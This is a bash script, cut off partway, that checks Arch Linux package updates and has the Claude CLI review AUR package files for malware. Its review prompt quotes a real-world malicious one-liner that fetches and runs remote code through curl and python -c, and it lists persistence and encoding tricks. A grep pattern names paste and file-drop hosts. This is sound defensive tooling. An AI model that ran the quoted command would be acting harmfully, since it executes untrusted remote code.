#!/bin/bash
# ~/bin/secure-update-v2.sh
# Enhanced security scanner with proper package detection and repository-based policies
# Version 2.0 - Fixes detection issues and adds smart security policies

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PARALLEL_JOBS=${PARALLEL_JOBS:-10}

# Model selection - haiku is 10x faster and cheaper than sonnet
# Options: haiku (fastest/cheapest), sonnet (balanced), opus (most thorough)
CLAUDE_MODEL=${CLAUDE_MODEL:-haiku}

# Repository security policies
TRUSTED_REPOS="core extra multilib nemesis_repo"  # These are signed and trusted
SCAN_REPOS="aur chaotic-aur"                       # These need security scanning
SCAN_OFFICIAL=${SCAN_OFFICIAL:-false}              # Set to true for paranoid mode

# Parse command line arguments
FULL_SCAN=false
FORCE_SCAN_ALL=false
SKIP_SCAN=false
UPDATE_ONLY_OFFICIAL=false
SHOW_ALL_PACKAGES=false
REVIEW_OFFICIAL=false
MAX_DISPLAY_PACKAGES=${MAX_DISPLAY_PACKAGES:-50}  # Default to showing 50 packages

for arg in "$@"; do
    case $arg in
        --full-scan)
            FULL_SCAN=true
            shift
            ;;
        --scan-all)
            FORCE_SCAN_ALL=true
            SCAN_OFFICIAL=true
            shift
            ;;
        --skip-scan)
            SKIP_SCAN=true
            shift
            ;;
        --official-only)
            UPDATE_ONLY_OFFICIAL=true
            shift
            ;;
        --review-official)
            REVIEW_OFFICIAL=true
            shift
            ;;
        --model=*)
            CLAUDE_MODEL="${arg#*=}"
            shift
            ;;
        --parallel=*)
            PARALLEL_JOBS="${arg#*=}"
            shift
            ;;
        --show-all)
            SHOW_ALL_PACKAGES=true
            shift
            ;;
        --max-display=*)
            MAX_DISPLAY_PACKAGES="${arg#*=}"
            shift
            ;;
        --help)
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --full-scan         Scan all installed AUR/chaotic packages (not just updates)"
            echo "  --scan-all          Scan ALL packages including official repos (paranoid mode)"
            echo "  --skip-scan         Skip security scan entirely (dangerous!)"
            echo "  --official-only     Only update official repo packages"
            echo "  --review-official   Review official packages too (time-consuming!)"
            echo "  --model=MODEL       Claude model to use: haiku (fast), sonnet (balanced), opus (thorough)"
            echo "                      Default: $CLAUDE_MODEL"
            echo "  --parallel=N        Number of parallel scan jobs (default: 10)"
            echo "  --show-all          Show all packages regardless of count"
            echo "  --max-display=N     Maximum packages to display (default: 50)"
            echo ""
            echo "Repository policies:"
            echo "  Trusted (auto-approved): $TRUSTED_REPOS"
            echo "  Requires scan: $SCAN_REPOS"
            echo ""
            echo "Performance tip: Use --model=haiku for 10x faster scans with good accuracy"
            exit 0
            ;;
        *)
            ;;
    esac
done

# Temporary directory for PKGBUILDs
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# Security report file in script directory
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
REPORT_FILE="$SCRIPT_DIR/aur-security-report-${TIMESTAMP}.log"
SCAN_RESULTS_DIR="$TMPDIR/scan_results"
mkdir -p "$SCAN_RESULTS_DIR"

echo -e "${BLUE}=== Enhanced Package Security Scanner v2.0 ===${NC}"
echo -e "${CYAN}Model: Claude $CLAUDE_MODEL (Anthropic)${NC}\n"

# First, update package databases
echo -e "${YELLOW}Updating package databases...${NC}"
sudo pacman -Sy

# Get all available updates with repository information
echo -e "${YELLOW}Detecting available updates...${NC}"

# Create output file
YAY_OUTPUT="$TMPDIR/yay_output.txt"

# Get and display official repo updates immediately
echo -e "${CYAN}Checking official repositories...${NC}"
pacman -Qu 2>/dev/null > "$YAY_OUTPUT"
OFFICIAL_UPDATE_COUNT=$(wc -l < "$YAY_OUTPUT")

if [ $OFFICIAL_UPDATE_COUNT -gt 0 ]; then
    echo -e "${GREEN}Official repo updates found: $OFFICIAL_UPDATE_COUNT${NC}"
    
    # Determine how many packages to show
    DISPLAY_LIMIT=$MAX_DISPLAY_PACKAGES
    if [[ "$SHOW_ALL_PACKAGES" == "true" ]]; then
        DISPLAY_LIMIT=$OFFICIAL_UPDATE_COUNT
    fi
    
    if [ $OFFICIAL_UPDATE_COUNT -le $DISPLAY_LIMIT ]; then
        echo -e "${CYAN}Official packages to update:${NC}"
        while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                # Extract package name and version info
                pkg=$(echo "$line" | awk '{print $1}')
                version_info=$(echo "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
                echo -e "  • ${pkg}: ${version_info}"
            fi
        done < "$YAY_OUTPUT"
    else
        echo -e "${CYAN}First $DISPLAY_LIMIT official packages to update:${NC}"
        head -n $DISPLAY_LIMIT "$YAY_OUTPUT" | while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                pkg=$(echo "$line" | awk '{print $1}')
                version_info=$(echo "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
                echo -e "  • ${pkg}: ${version_info}"
            fi
        done
        echo -e "${YELLOW}... and $((OFFICIAL_UPDATE_COUNT - DISPLAY_LIMIT)) more packages${NC}"
        echo -e "${YELLOW}Use --show-all or --max-display=N to see more${NC}"
    fi
else
    echo -e "${GREEN}No official repo updates available${NC}"
fi

# Get AUR updates with progress feedback
echo -e "${CYAN}Checking AUR packages... (this may take a moment)${NC}"
echo "=== AUR Updates ===" >> "$YAY_OUTPUT"

# Run yay with timeout and show progress
{
    timeout 120 yay -Qua 2>/dev/null >> "$YAY_OUTPUT" &
    YAY_PID=$!
    
    # Show progress dots while yay is running
    while kill -0 $YAY_PID 2>/dev/null; do
        echo -n "."
        sleep 2
    done
    echo ""
    
    wait $YAY_PID
    YAY_EXIT_CODE=$?
    
    if [ $YAY_EXIT_CODE -eq 124 ]; then
        echo -e "${YELLOW}Warning: AUR check timed out after 2 minutes${NC}"
    fi
} 2>/dev/null

# Count and display AUR updates
AUR_LINES=$(sed -n '/=== AUR Updates ===/,$p' "$YAY_OUTPUT" | grep -v "=== AUR Updates ===" | grep -c '^[^[:space:]]' || echo "0")
if [ $AUR_LINES -gt 0 ]; then
    echo -e "${GREEN}AUR updates found: $AUR_LINES${NC}"
    
    # Determine how many AUR packages to show
    AUR_DISPLAY_LIMIT=$MAX_DISPLAY_PACKAGES
    if [[ "$SHOW_ALL_PACKAGES" == "true" ]]; then
        AUR_DISPLAY_LIMIT=$AUR_LINES
    fi
    
    if [ $AUR_LINES -le $AUR_DISPLAY_LIMIT ]; then
        echo -e "${CYAN}AUR packages to update:${NC}"
        sed -n '/=== AUR Updates ===/,$p' "$YAY_OUTPUT" | grep -v "=== AUR Updates ===" | while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                # Extract package name and version info
                pkg=$(echo "$line" | awk '{print $1}')
                version_info=$(echo "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
                if [[ -n "$version_info" ]]; then
                    echo -e "  • ${pkg}: ${version_info}"
                else
                    echo -e "  • ${pkg}: (version info not available)"
                fi
            fi
        done
    else
        echo -e "${CYAN}First $AUR_DISPLAY_LIMIT AUR packages to update:${NC}"
        sed -n '/=== AUR Updates ===/,$p' "$YAY_OUTPUT" | grep -v "=== AUR Updates ===" | head -n $AUR_DISPLAY_LIMIT | while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                pkg=$(echo "$line" | awk '{print $1}')
                version_info=$(echo "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
                if [[ -n "$version_info" ]]; then
                    echo -e "  • ${pkg}: ${version_info}"
                else
                    echo -e "  • ${pkg}: (version info not available)"
                fi
            fi
        done
        echo -e "${YELLOW}... and $((AUR_LINES - AUR_DISPLAY_LIMIT)) more AUR packages${NC}"
        echo -e "${YELLOW}Use --show-all or --max-display=N to see more${NC}"
    fi
else
    echo -e "${GREEN}No AUR updates available${NC}"
fi

# Early confirmation - ask user about proceeding before heavy analysis
TOTAL_UPDATES_ESTIMATE=$((OFFICIAL_UPDATE_COUNT + AUR_LINES))
if [ $TOTAL_UPDATES_ESTIMATE -gt 0 ]; then
    echo -e "\n${BLUE}═══ Update Summary ═══${NC}"
    echo -e "${CYAN}Found ${YELLOW}$TOTAL_UPDATES_ESTIMATE${CYAN} packages to update:${NC}"
    echo -e "  ${GREEN}Official packages: $OFFICIAL_UPDATE_COUNT${NC} (trusted, auto-approved)"
    echo -e "  ${YELLOW}AUR packages: $AUR_LINES${NC} (will need security review)"
    
    # Ask if user wants to proceed
    echo -e "\n${YELLOW}Do you want to proceed? [y/N]${NC}"
    read -r proceed_response
    
    if [[ ! "$proceed_response" =~ ^[Yy]$ ]]; then
        echo -e "\n${CYAN}Operation cancelled by user.${NC}"
        exit 0
    fi
fi

# Determine which packages need security review
echo -e "\n${CYAN}Determining which packages need security review...${NC}"

# Collect AUR packages that need updates
declare -a AUR_PACKAGES_LIST
if [ $AUR_LINES -gt 0 ]; then
    while IFS= read -r line; do
        if [[ -n "$line" ]] && [[ "$line" != "=== AUR Updates ===" ]]; then
            pkg=$(echo "$line" | awk '{print $1}')
            version_info=$(echo "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
            if [[ -n "$pkg" ]]; then
                AUR_PACKAGES_LIST+=("$pkg:$version_info")
            fi
        fi
    done < <(sed -n '/=== AUR Updates ===/,$p' "$YAY_OUTPUT" | grep -v "=== AUR Updates ===")
fi

# Collect official packages if review requested
declare -a OFFICIAL_PACKAGES_LIST
if [[ "$REVIEW_OFFICIAL" == "true" ]] && [ $OFFICIAL_UPDATE_COUNT -gt 0 ]; then
    while IFS= read -r line; do
        if [[ -n "$line" ]]; then
            pkg=$(echo "$line" | awk '{print $1}')
            version_info=$(echo "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
            if [[ -n "$pkg" ]]; then
                OFFICIAL_PACKAGES_LIST+=("$pkg:$version_info")
            fi
        fi
    done < <(pacman -Qu 2>/dev/null)
fi

# Determine what to scan
declare -A PACKAGES_TO_SCAN

if [[ "$UPDATE_ONLY_OFFICIAL" == "true" ]]; then
    echo -e "\n${CYAN}Official-only mode: Skipping AUR packages${NC}"
elif [[ "$SKIP_SCAN" == "true" ]]; then
    echo -e "\n${RED}⚠️  WARNING: Security scanning disabled!${NC}"
    # Add all AUR packages without scanning
    for pkg_info in "${AUR_PACKAGES_LIST[@]}"; do
        pkg="${pkg_info%%:*}"
        PACKAGES_TO_SCAN["$pkg"]="aur"
    done
else
    # Show AUR packages and ask which ones to review
    if [ ${#AUR_PACKAGES_LIST[@]} -gt 0 ]; then
        echo -e "\n${BLUE}═══ Security Review Selection ═══${NC}"
        echo -e "${YELLOW}The following AUR packages need updates:${NC}\n"
        
        for i in "${!AUR_PACKAGES_LIST[@]}"; do
            pkg_info="${AUR_PACKAGES_LIST[$i]}"
            pkg="${pkg_info%%:*}"
            version="${pkg_info#*:}"
            printf "  [%2d] %-30s %s\n" $((i+1)) "$pkg" "$version"
        done
        
        echo -e "\n${YELLOW}Select packages to security review:${NC}"
        echo -e "${CYAN}Options:${NC}"
        echo -e "  ${GREEN}a${NC} - Review all AUR packages (recommended)"
        echo -e "  ${YELLOW}n${NC} - Skip review (dangerous!)"
        echo -e "  ${CYAN}1,2,3${NC} - Review specific packages (comma-separated numbers)"
        echo -e "  ${CYAN}1-5${NC} - Review range of packages"
        echo -e "\n${YELLOW}Your choice [a]: ${NC}"
        read -r review_choice
        
        # Default to 'a' if empty
        review_choice="${review_choice:-a}"
        
        if [[ "$review_choice" == "n" || "$review_choice" == "N" ]]; then
            echo -e "\n${RED}⚠️  Skipping security review as requested${NC}"
            SKIP_SCAN=true
        elif [[ "$review_choice" == "a" || "$review_choice" == "A" ]]; then
            echo -e "\n${GREEN}Will review all ${#AUR_PACKAGES_LIST[@]} AUR packages${NC}"
            for pkg_info in "${AUR_PACKAGES_LIST[@]}"; do
                pkg="${pkg_info%%:*}"
                PACKAGES_TO_SCAN["$pkg"]="aur"
            done
        else
            # Parse specific selections
            echo -e "\n${CYAN}Parsing your selection...${NC}"
            IFS=',' read -ra SELECTIONS <<< "$review_choice"
            for selection in "${SELECTIONS[@]}"; do
                selection=$(echo "$selection" | xargs) # trim whitespace
                if [[ "$selection" =~ ^([0-9]+)-([0-9]+)$ ]]; then
                    # Range selection
                    start="${BASH_REMATCH[1]}"
                    end="${BASH_REMATCH[2]}"
                    for ((j=$start-1; j<=$end-1 && j<${#AUR_PACKAGES_LIST[@]}; j++)); do
                        if [ $j -ge 0 ]; then
                            pkg_info="${AUR_PACKAGES_LIST[$j]}"
                            pkg="${pkg_info%%:*}"
                            PACKAGES_TO_SCAN["$pkg"]="aur"
                            echo -e "  Added: $pkg"
                        fi
                    done
                elif [[ "$selection" =~ ^[0-9]+$ ]]; then
                    # Single number
                    idx=$((selection - 1))
                    if [ $idx -ge 0 ] && [ $idx -lt ${#AUR_PACKAGES_LIST[@]} ]; then
                        pkg_info="${AUR_PACKAGES_LIST[$idx]}"
                        pkg="${pkg_info%%:*}"
                        PACKAGES_TO_SCAN["$pkg"]="aur"
                        echo -e "  Added: $pkg"
                    fi
                fi
            done
            echo -e "${GREEN}Selected ${#PACKAGES_TO_SCAN[@]} packages for review${NC}"
        fi
    fi
fi

# Handle official package review if requested
if [[ "$REVIEW_OFFICIAL" == "true" ]] && [ ${#OFFICIAL_PACKAGES_LIST[@]} -gt 0 ]; then
    echo -e "\n${BLUE}═══ Official Package Review Selection ═══${NC}"
    echo -e "${YELLOW}⚠️  Warning: Reviewing official packages is time-consuming!${NC}"
    echo -e "${CYAN}Official packages are already signed and trusted by Arch maintainers.${NC}"
    echo -e "\n${YELLOW}Found ${#OFFICIAL_PACKAGES_LIST[@]} official packages. Select which to review:${NC}\n"
    
    # Show first 20 official packages
    local show_count=20
    if [ ${#OFFICIAL_PACKAGES_LIST[@]} -lt 20 ]; then
        show_count=${#OFFICIAL_PACKAGES_LIST[@]}
    fi
    
    for i in $(seq 0 $((show_count - 1))); do
        pkg_info="${OFFICIAL_PACKAGES_LIST[$i]}"
        pkg="${pkg_info%%:*}"
        version="${pkg_info#*:}"
        printf "  [%3d] %-30s %s\n" $((i+1)) "$pkg" "$version"
    done
    
    if [ ${#OFFICIAL_PACKAGES_LIST[@]} -gt 20 ]; then
        echo -e "  ... and $((${#OFFICIAL_PACKAGES_LIST[@]} - 20)) more packages"
    fi
    
    echo -e "\n${YELLOW}Select official packages to review:${NC}"
    echo -e "${CYAN}Options:${NC}"
    echo -e "  ${YELLOW}s${NC} - Skip official review (recommended)"
    echo -e "  ${CYAN}1,2,3${NC} - Review specific packages"
    echo -e "  ${CYAN}1-10${NC} - Review range"
    echo -e "  ${RED}a${NC} - Review ALL (very slow!)"
    echo -e "\n${YELLOW}Your choice [s]: ${NC}"
    read -r official_choice
    
    official_choice="${official_choice:-s}"
    
    if [[ "$official_choice" != "s" && "$official_choice" != "S" ]]; then
        if [[ "$official_choice" == "a" || "$official_choice" == "A" ]]; then
            echo -e "\n${RED}⚠️  Will review ALL ${#OFFICIAL_PACKAGES_LIST[@]} official packages!${NC}"
            echo -e "${YELLOW}This will take a LONG time. Continue? [y/N]${NC}"
            read -r confirm
            if [[ "$confirm" =~ ^[Yy]$ ]]; then
                for pkg_info in "${OFFICIAL_PACKAGES_LIST[@]}"; do
                    pkg="${pkg_info%%:*}"
                    PACKAGES_TO_SCAN["$pkg"]="official"
                done
            fi
        else
            # Parse specific selections
            IFS=',' read -ra SELECTIONS <<< "$official_choice"
            for selection in "${SELECTIONS[@]}"; do
                selection=$(echo "$selection" | xargs)
                if [[ "$selection" =~ ^([0-9]+)-([0-9]+)$ ]]; then
                    start="${BASH_REMATCH[1]}"
                    end="${BASH_REMATCH[2]}"
                    for ((j=$start-1; j<=$end-1 && j<${#OFFICIAL_PACKAGES_LIST[@]}; j++)); do
                        if [ $j -ge 0 ]; then
                            pkg_info="${OFFICIAL_PACKAGES_LIST[$j]}"
                            pkg="${pkg_info%%:*}"
                            PACKAGES_TO_SCAN["$pkg"]="official"
                            echo -e "  Added: $pkg (official)"
                        fi
                    done
                elif [[ "$selection" =~ ^[0-9]+$ ]]; then
                    idx=$((selection - 1))
                    if [ $idx -ge 0 ] && [ $idx -lt ${#OFFICIAL_PACKAGES_LIST[@]} ]; then
                        pkg_info="${OFFICIAL_PACKAGES_LIST[$idx]}"
                        pkg="${pkg_info%%:*}"
                        PACKAGES_TO_SCAN["$pkg"]="official"
                        echo -e "  Added: $pkg (official)"
                    fi
                fi
            done
        fi
    fi
fi

# Perform security scan if we have packages to scan
if [ ${#PACKAGES_TO_SCAN[@]} -gt 0 ] && [[ "$SKIP_SCAN" != "true" ]]; then
    echo -e "\n${BLUE}═══ Starting Security Review ═══${NC}"
    echo -e "${CYAN}Reviewing ${#PACKAGES_TO_SCAN[@]} packages with Claude AI (model: $CLAUDE_MODEL)${NC}"
    echo -e "${CYAN}Estimated time: ~$((${#PACKAGES_TO_SCAN[@]} * 3 / PARALLEL_JOBS)) minutes with $PARALLEL_JOBS parallel jobs${NC}\n"

    # Initialize report
    cat > "$REPORT_FILE" << EOF
Enhanced Package Security Scan Report v2.0
Generated: $(date)
Model: Claude $CLAUDE_MODEL

Update Summary:
  Official Updates: $OFFICIAL_UPDATE_COUNT (auto-approved)
  AUR Updates: $AUR_LINES
  Packages to Review: ${#PACKAGES_TO_SCAN[@]}
  
Parallel Jobs: $PARALLEL_JOBS
======================================

EOF

    # Function to scan a single package (reuse from original with minor improvements)
    scan_package() {
        local package="$1"
        local source_type="$2"
        local result_file="$3"
        local work_dir="$TMPDIR/work_$$_${RANDOM}"
        
        mkdir -p "$work_dir"
        cd "$work_dir"
        
        # Initialize result
        echo "PACKAGE: $package" > "$result_file"
        echo "SOURCE: $source_type" >> "$result_file"
        echo "START_TIME: $(date +%s)" >> "$result_file"
        
        # Try to get PKGBUILD
        local fetch_success=false
        
        if [[ "$source_type" == "official" ]]; then
            # Use asp to fetch official package sources
            if command -v asp &>/dev/null; then
                if asp checkout "$package" &>/dev/null 2>&1; then
                    fetch_success=true
                    # Move to the package directory
                    if [ -d "$package/trunk" ]; then
                        mv "$package/trunk" "./${package}-src"
                    elif [ -d "$package/repos" ]; then
                        # Find the most relevant repo (prefer core/extra/multilib)
                        local repo_dir=$(find "$package/repos" -maxdepth 1 -type d | grep -E "(core|extra|multilib)-x86_64" | head -1)
                        if [ -n "$repo_dir" ]; then
                            mv "$repo_dir" "./${package}-src"
                        fi
                    fi
                    rm -rf "$package"
                    [ -d "${package}-src" ] && mv "${package}-src" "$package"
                else
                    # Fallback: try to get PKGBUILD from git
                    git clone --depth 1 "https://github.com/archlinux/svntogit-packages/tree/packages/${package}/trunk" "$package" &>/dev/null 2>&1 && fetch_success=true
                fi
            else
                echo "STATUS: FAILED_NO_ASP" >> "$result_file"
                echo "END_TIME: $(date +%s)" >> "$result_file"
                rm -rf "$work_dir"
                return
            fi
        elif [[ "$source_type" == "chaotic-aur" ]]; then
            # Try various package name variants for chaotic-aur
            for variant in "$package" "${package%-git}" "${package%-bin}" "${package%-git}-git" "${package%-bin}-bin"; do
                if yay -G "$variant" &>/dev/null 2>&1; then
                    fetch_success=true
                    break
                fi
            done
        else
            if yay -G "$package" &>/dev/null 2>&1; then
                fetch_success=true
            fi
        fi
        
        if [[ "$fetch_success" != "true" ]]; then
            echo "STATUS: FAILED_DOWNLOAD" >> "$result_file"
            echo "END_TIME: $(date +%s)" >> "$result_file"
            rm -rf "$work_dir"
            return
        fi
        
        # Find the package directory
        local pkg_dir=$(find . -maxdepth 1 -type d ! -name "." | head -1)
        if [ -z "$pkg_dir" ]; then
            echo "STATUS: FAILED_NO_DIR" >> "$result_file"
            echo "END_TIME: $(date +%s)" >> "$result_file"
            rm -rf "$work_dir"
            return
        fi
        
        cd "$pkg_dir"
        
        # Check for binary files and scan them for suspicious patterns
        local binary_findings=""
        for file in $(find . -type f -name "*.AppImage" -o -name "*.deb" -o -name "*.tar.gz" -o -name "*.tar.xz" 2>/dev/null); do
            # Extract strings from binary and check for suspicious patterns
            local suspicious_urls=$(strings "$file" 2>/dev/null | grep -iE "(pastebin\.com|bit\.ly|tinyurl|discord\.gg/[a-zA-Z0-9]+|telegram\.me|t\.me/|segs\.lol|temp\.sh|transfer\.sh)" || true)
            local crypto_wallets=$(strings "$file" 2>/dev/null | grep -E "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$|^0x[a-fA-F0-9]{40}$" || true)
            
            if [ -n "$suspicious_urls" ] || [ -n "$crypto_wallets" ]; then
                binary_findings="${binary_findings}Binary $file contains suspicious content:\n"
                [ -n "$suspicious_urls" ] && binary_findings="${binary_findings}URLs: $suspicious_urls\n"
                [ -n "$crypto_wallets" ] && binary_findings="${binary_findings}Crypto: $crypto_wallets\n"
            fi
        done
        
        # Create security prompt
        local security_prompt="You are a security expert reviewing a package for malware. Be thorough but reasonable.

Package: $package
Source: $source_type

Review ALL files in this directory. Known attack vectors include:
- curl/wget downloading and executing remote scripts
- python -c commands with base64/hex encoded payloads
- Obfuscated code or suspicious encoding
- Creation of systemd services for persistence
- Modifications to PATH, .bashrc, or system configs
- Suspicious URLs (pastebin, URL shorteners, random domains)
- Scripts that download additional scripts
- Crypto mining or wallet addresses

Recent real malware example:
python -c \"\$(curl https://segs.lol/TfPjm0)\"

Binary scan results:
${binary_findings:-No suspicious patterns found in binaries}

IMPORTANT NOTES:
- Pre-built binaries from official sources (GitHub releases, official websites) are generally SAFE
- Only flag as HIGH/CRITICAL if there's actual malicious code or very suspicious behavior
- Downloading binaries is normal for -bin packages, this alone is NOT a security issue
- Focus on actual threats, not standard packaging practices

Provide analysis with:
1. Overall verdict: SAFE or THREAT DETECTED
2. Risk level: NONE (no issues), LOW (minor concerns), MEDIUM (needs attention), HIGH (suspicious), CRITICAL (malware)
3. If threats found: Specific remediation steps
4. Remember: Binary packages downloading from official sources = SAFE

Format your response as:
VERDICT: [SAFE/THREAT DETECTED]
RISK: [NONE/LOW/MEDIUM/HIGH/CRITICAL]
SUMMARY: [One line summary]
DETAILS:
[Findings with file names and line numbers if relevant]
REMEDIATION:
[If threats found, specific steps to fix or mitigate]"
        
        # Review with Claude (using configured model)
        local claude_response=$(claude --model "$CLAUDE_MODEL" --print "$security_prompt" . 2>&1)
        
        # Parse response (take only first occurrence to avoid duplicates)
        local verdict=$(echo "$claude_response" | grep -i "^VERDICT:" | head -1 | cut -d: -f2- | xargs)
        local risk=$(echo "$claude_response" | grep -i "^RISK:" | head -1 | cut -d: -f2- | xargs)
        local summary=$(echo "$claude_response" | grep -i "^SUMMARY:" | head -1 | cut -d: -f2- | xargs)
        
        # Extract remediation section if present
        local remediation=$(echo "$claude_response" | sed -n '/^REMEDIATION:/,/^[A-Z]*:/{/^REMEDIATION:/d;/^[A-Z]*:/d;p}')
        
        # Write results
        echo "STATUS: SCANNED" >> "$result_file"
        echo "VERDICT: $verdict" >> "$result_file"
        echo "RISK: $risk" >> "$result_file"
        echo "SUMMARY: $summary" >> "$result_file"
        if [ -n "$remediation" ]; then
            echo "REMEDIATION: $remediation" >> "$result_file"
        fi
        echo "CLAUDE_RESPONSE_START" >> "$result_file"
        echo "$claude_response" >> "$result_file"
        echo "CLAUDE_RESPONSE_END" >> "$result_file"
        echo "END_TIME: $(date +%s)" >> "$result_file"
        
        # Clean up
        rm -rf "$work_dir"
    }

    # Progress tracking
    TOTAL_PACKAGES=${#PACKAGES_TO_SCAN[@]}
    COMPLETED=0
    SCAN_START_TIME=$(date +%s)

    # Export functions and variables for parallel execution
    export -f scan_package
    export TMPDIR SCAN_RESULTS_DIR CLAUDE_MODEL

    # Create a function to monitor progress
    monitor_scan_progress() {
        local total=$1
        local start_time=$(date +%s)
        
        while [ $(find "$SCAN_RESULTS_DIR" -name "*.result" 2>/dev/null | wc -l) -lt $total ]; do
            local completed=$(find "$SCAN_RESULTS_DIR" -name "*.result" 2>/dev/null | wc -l)
            local elapsed=$(($(date +%s) - start_time))
            local rate=$(if [ $elapsed -gt 0 ]; then echo "scale=1; $completed / $elapsed" | bc 2>/dev/null || echo "0"; else echo "0"; fi)
            local percent=$((completed * 100 / total))
            
            echo -ne "\r${CYAN}Progress: $completed/$total ($percent%) - Rate: $rate pkg/sec${NC}    "
            sleep 2
        done
        echo ""
    }

    # Start progress monitor in background
    monitor_scan_progress ${#PACKAGES_TO_SCAN[@]} &
    MONITOR_PID=$!

    # Run scans in parallel using xargs
    printf "%s\n" "${!PACKAGES_TO_SCAN[@]}" | \
        xargs -P "$PARALLEL_JOBS" -I {} bash -c '
            pkg="{}"
            source_type="'"${PACKAGES_TO_SCAN[{}]}"'"
            result_file="'"$SCAN_RESULTS_DIR"'/${pkg//\//_}.result"
            scan_package "$pkg" "$source_type" "$result_file"
        '

    # Stop progress monitor
    kill $MONITOR_PID 2>/dev/null || true
    wait $MONITOR_PID 2>/dev/null || true

    echo -e "\n${YELLOW}Processing results...${NC}"

    # Process results
    SAFE_PACKAGES=""
    FAILED_PACKAGES=""
    THREAT_PACKAGES=""
    FAILED_DOWNLOADS=""

    # Summary statistics
    THREATS_CRITICAL=0
    THREATS_HIGH=0
    THREATS_MEDIUM=0
    THREATS_LOW=0
    WARNINGS_PACKAGES=""

    for pkg in "${!PACKAGES_TO_SCAN[@]}"; do
        result_file="$SCAN_RESULTS_DIR/${pkg//\//_}.result"
        
        if [ ! -f "$result_file" ]; then
            FAILED_DOWNLOADS="$FAILED_DOWNLOADS $pkg"
            continue
        fi
        
        # Read result
        status=$(grep "^STATUS:" "$result_file" | cut -d: -f2- | xargs)
        
        if [[ "$status" == "FAILED_DOWNLOAD" ]] || [[ "$status" == "FAILED_NO_DIR" ]]; then
            FAILED_DOWNLOADS="$FAILED_DOWNLOADS $pkg"
            echo -e "\n--- $pkg ---" >> "$REPORT_FILE"
            echo "Failed to download PKGBUILD" >> "$REPORT_FILE"
            continue
        fi
        
        verdict=$(grep "^VERDICT:" "$result_file" | cut -d: -f2- | xargs)
        risk=$(grep "^RISK:" "$result_file" | cut -d: -f2- | xargs)
        summary=$(grep "^SUMMARY:" "$result_file" | cut -d: -f2- | xargs)
        
        # Append to report
        echo -e "\n--- $pkg (${PACKAGES_TO_SCAN[$pkg]}) ---" >> "$REPORT_FILE"
        echo "Verdict: $verdict" >> "$REPORT_FILE"
        echo "Risk: $risk" >> "$REPORT_FILE"
        echo "Summary: $summary" >> "$REPORT_FILE"
        
        # Extract Claude's full response
        sed -n '/^CLAUDE_RESPONSE_START$/,/^CLAUDE_RESPONSE_END$/p' "$result_file" | \
            sed '1d;$d' >> "$REPORT_FILE"
        
        # Categorize results - Only HIGH and CRITICAL are actual threats
        # MEDIUM = warning, NONE/LOW/empty = safe
        if [[ "$verdict" == "THREAT DETECTED" ]] || [[ "$risk" == "HIGH" ]] || [[ "$risk" == "CRITICAL" ]]; then
            THREAT_PACKAGES="$THREAT_PACKAGES $pkg"
            case "$risk" in
                "CRITICAL") ((THREATS_CRITICAL++)) ;;
                "HIGH") ((THREATS_HIGH++)) ;;
            esac
        elif [[ "$risk" == "MEDIUM" ]]; then
            # MEDIUM risk = warning but not blocking
            WARNINGS_PACKAGES="$WARNINGS_PACKAGES $pkg"
            ((THREATS_MEDIUM++))
            SAFE_PACKAGES="$SAFE_PACKAGES $pkg"  # Still considered safe enough to proceed
        else
            # SAFE, NONE, LOW, or empty risk = safe package
            SAFE_PACKAGES="$SAFE_PACKAGES $pkg"
        fi
    done

    # Calculate scan duration
    SCAN_END_TIME=$(date +%s)
    SCAN_DURATION=$((SCAN_END_TIME - SCAN_START_TIME))
    SCAN_MINUTES=$((SCAN_DURATION / 60))
    SCAN_SECONDS=$((SCAN_DURATION % 60))

    # Display summary
    echo -e "\n${BLUE}═══ Security Review Complete ═══${NC}\n"

    echo -e "${CYAN}Review Statistics:${NC}"
    echo -e "  Packages reviewed: ${#PACKAGES_TO_SCAN[@]}"
    echo -e "  Review duration: ${SCAN_MINUTES}m ${SCAN_SECONDS}s"
    echo -e "  Parallel jobs used: $PARALLEL_JOBS"

    echo -e "\n${CYAN}Review Results:${NC}"
    echo -e "  ${GREEN}Safe packages: $(echo $SAFE_PACKAGES | wc -w)${NC}"
    if [ $(echo $WARNINGS_PACKAGES | wc -w) -gt 0 ]; then
        echo -e "  ${YELLOW}Warnings: $(echo $WARNINGS_PACKAGES | wc -w)${NC} (medium risk, proceed with caution)"
    fi
    echo -e "  ${RED}Threats detected: $(echo $THREAT_PACKAGES | wc -w)${NC}"
    if [ $THREATS_CRITICAL -gt 0 ]; then
        echo -e "    ${RED}Critical: $THREATS_CRITICAL${NC}"
    fi
    if [ $THREATS_HIGH -gt 0 ]; then
        echo -e "    ${RED}High: $THREATS_HIGH${NC}"
    fi
    if [ $THREATS_MEDIUM -gt 0 ]; then
        echo -e "    ${YELLOW}Medium (warnings): $THREATS_MEDIUM${NC}"
    fi
    echo -e "  ${YELLOW}Failed downloads: $(echo $FAILED_DOWNLOADS | wc -w)${NC}"

    # List warnings if any
    if [ -n "$WARNINGS_PACKAGES" ]; then
        echo -e "\n${YELLOW}═══ SECURITY WARNINGS ═══${NC}"
        echo -e "${CYAN}The following packages have medium-risk issues but can proceed:${NC}"
        for pkg in $WARNINGS_PACKAGES; do
            result_file="$SCAN_RESULTS_DIR/${pkg//\//_}.result"
            summary=$(grep "^SUMMARY:" "$result_file" | cut -d: -f2- | xargs)
